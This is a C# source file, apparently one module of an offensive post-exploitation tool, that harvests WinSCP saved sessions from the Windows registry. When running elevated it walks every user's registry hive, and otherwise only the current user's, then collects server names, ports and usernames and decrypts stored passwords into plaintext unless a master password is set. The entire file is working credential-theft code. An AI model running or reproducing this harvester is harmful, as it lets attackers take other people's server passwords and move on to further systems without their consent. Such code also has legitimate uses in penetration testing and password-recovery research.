using Microsoft.Win32;
using System;
using System.Security.Principal;
using System.Text.RegularExpressions;

namespace Gopher.Holes
{
	class WinSCP
	{
		//Based on logic from:
		//	https://github.com/anoopengineer/winscppasswd/blob/master/main.go
		//	https://github.com/YuriMB/WinSCP-Password-Recovery
		//	https://gist.github.com/jojonas/07c3771711fb19aed1f3

		struct Cipher
		{
			public int Flag;
			public string Remainder;

			public Cipher(int flag, string remainder)
			{
				Flag = flag;
				Remainder = remainder;
			}
		}

		private static Cipher DecryptNextCharacter(string remainder)
		{
			int first = "0123456789ABCDEF".IndexOf(remainder[0]) * 16;
			int second = "0123456789ABCDEF".IndexOf(remainder[1]);
			int plaintext = ((~((first + second) ^ 163) % 256) + 256) % 256;

			return new Cipher(plaintext, remainder.Substring(2));
		}

		private static string Decrypt(string hostname, string username, string ciphertext)
		{
			Cipher cipher = DecryptNextCharacter(ciphertext);
			int stored = cipher.Flag;

			if (cipher.Flag == 255)
			{
				cipher = DecryptNextCharacter(cipher.Remainder.Substring(2));
			}

			int length = cipher.Flag;
			cipher = DecryptNextCharacter(cipher.Remainder);
			cipher.Remainder = cipher.Remainder.Substring(cipher.Flag * 2);
			string plaintext = "";

			for (int i = 0; i < length; i++)
			{
				cipher = DecryptNextCharacter(cipher.Remainder);
				plaintext += (char)cipher.Flag;
			}

			if (stored == 255)
			{
				plaintext = plaintext.Substring(hostname.Length + username.Length);
			}

			return plaintext;
		}

		public static string Dig(bool isHighIntegrity)
		{
			string findings = "";

			if (isHighIntegrity)
			{
				foreach (string sid in Registry.Users.GetSubKeyNames())
				{
					Regex regex = new Regex(@"^S-1-5-21-[\d\-]+$");

					if (regex.IsMatch(sid))
					{
						RegistryKey sessions = Registry.Users.OpenSubKey(sid + @"\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions");

						if (sessions != null)
						{
							if (sessions.SubKeyCount > 0)
							{
								string user = new SecurityIdentifier(sid).Translate(typeof(NTAccount)).ToString();
								object useMasterPassword = Registry.Users.OpenSubKey(sid + @"\SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security").GetValue("UseMasterPassword");
								findings += string.Format("\n# ---- WinSCP sessions of user {0} ---- #\n", user.Split('\\')[1]);

								foreach (string session in sessions.GetSubKeyNames())
								{
									object hostname = sessions.OpenSubKey(session).GetValue("HostName");

									if (hostname != null)
									{
										object port = sessions.OpenSubKey(session).GetValue("PortNumber");

										if (port != null)
										{
											findings += string.Format("|\n|   Server   : {0}:{1}\n", hostname.ToString(), Convert.ToInt32(port));
										}
										else
										{
											findings += string.Format("|\n|   Server   : {0}\n", hostname.ToString());
										}

										object username = sessions.OpenSubKey(session).GetValue("UserName");

										if (username != null)
										{
											findings += string.Format("|   Username : {0}\n", username.ToString());
										}

										object password = sessions.OpenSubKey(session).GetValue("Password");

										if (password != null)
										{
											if (Convert.ToInt32(useMasterPassword) == 0)
											{
												findings += string.Format("|   Password : {0}\n", Decrypt(hostname.ToString(), username.ToString(), password.ToString()));
											}
											else
											{
												findings += "|   Password : Saved in session, but master password prevents plaintext recovery\n";
											}
										}
									}
								}

								findings += "|\n# ---- #\n";
							}
						}
					}
				}
			}
			else
			{
				RegistryKey sessions = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Martin Prikryl\WinSCP 2\Sessions");

				if (sessions != null)
				{
					if (sessions.SubKeyCount > 0)
					{
						findings += "\n# ---- WinSCP sessions ---- #\n";
						object useMasterPassword = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security").GetValue("UseMasterPassword");

						foreach (string session in sessions.GetSubKeyNames())
						{
							object hostname = sessions.OpenSubKey(session).GetValue("HostName");

							if (hostname != null)
							{
								object port = sessions.OpenSubKey(session).GetValue("PortNumber");

								if (port != null)
								{
									findings += string.Format("|\n|   Server   : {0}:{1}\n", hostname.ToString(), Convert.ToInt32(port));
								}
								else
								{
									findings += string.Format("|\n|   Server   : {0}\n", hostname.ToString());
								}

								object username = sessions.OpenSubKey(session).GetValue("UserName");

								if (username != null)
								{
									findings += string.Format("|   Username : {0}\n", username.ToString());
								}

								object password = sessions.OpenSubKey(session).GetValue("Password");

								if (password != null)
								{
									if (Convert.ToInt32(useMasterPassword) == 0)
									{
										findings += string.Format("|   Password : {0}\n", Decrypt(hostname.ToString(), username.ToString(), password.ToString()));
									}
									else
									{
										findings += "|   Password : Saved in session, but master password prevents plaintext recovery\n";
									}
								}
							}
						}

						findings += "|\n# ---- #\n";
					}
				}
			}

			return findings;
		}
	}
}
